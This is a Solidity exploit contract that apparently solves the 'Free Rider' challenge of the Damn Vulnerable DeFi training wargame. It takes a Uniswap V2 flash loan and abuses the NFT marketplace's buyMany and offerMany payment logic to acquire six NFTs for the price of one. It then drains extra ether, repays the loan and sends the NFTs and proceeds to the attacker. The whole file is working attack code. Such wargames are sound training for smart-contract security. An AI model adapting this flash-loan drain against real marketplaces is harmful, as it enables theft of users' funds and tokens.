pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "../DamnValuableNFT.sol";


interface IFreeRiderNFTMarketplace {
   function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
   function buyMany(uint256[] calldata tokenIds) external payable; 
}

interface IWETH9 {
   function deposit() external payable;
   function withdraw(uint wad) external;
   function approve(address guy, uint wad) external returns (bool);
   function transfer(address dst, uint wad) external returns (bool); 
}

contract FreeRiderExp is IUniswapV2Callee, IERC721Receiver {

    address public owner;
    address private buyer;
    IFreeRiderNFTMarketplace private targetMarket;
    IWETH9 private weth;
    DamnValuableNFT private dvnft;
    
    constructor(address _owner, address _targetMarket, address _weth, address _dvnft, address _buyer) {
        owner = _owner;
        buyer = _buyer;
        targetMarket = IFreeRiderNFTMarketplace(_targetMarket);
        weth = IWETH9(_weth);
        dvnft = DamnValuableNFT(_dvnft);
    }
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
       // convert eth to eth
       weth.withdraw(amount0); 
       
       // buy 6 NFT for 15 ether
       uint256[] memory tokenIds = new uint256[](6);
       for (uint i = 0; i < 6; i++) {
           tokenIds[i] = i;
       }
       targetMarket.buyMany{value: 15 ether}(tokenIds);

       // sale 2 NFT for 15 ether each
       uint256[] memory tokensToResale = new uint256[](2);
       tokensToResale[0] = 0;
       tokensToResale[1] = 1;

       uint256[] memory prices = new uint256[](2);
       prices[0] = 15 ether;
       prices[1] = 15 ether;
       
       dvnft.setApprovalForAll(address(targetMarket), true);
       targetMarket.offerMany(tokensToResale, prices);
       
       // by the 2 NFT for 15 ether (we should get 30 ether in return)
       targetMarket.buyMany{value: 15 ether}(tokensToResale);
       
       /* 
        * calculate return amount by uniswapv2 fromula
        * suggested fee is nearly 0.301%
        */
       uint256 returnAmount = amount0 + ((amount0 * 301) / 100000);
       weth.deposit{value: returnAmount}();

       // return the flashloan
       weth.transfer(msg.sender, returnAmount);
       
       // give NFTs to attacker
       for (uint i = 0; i < 6; i++) {
           dvnft.safeTransferFrom(address(this), buyer, i);
       }

       // pay ethers to attacker
       payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}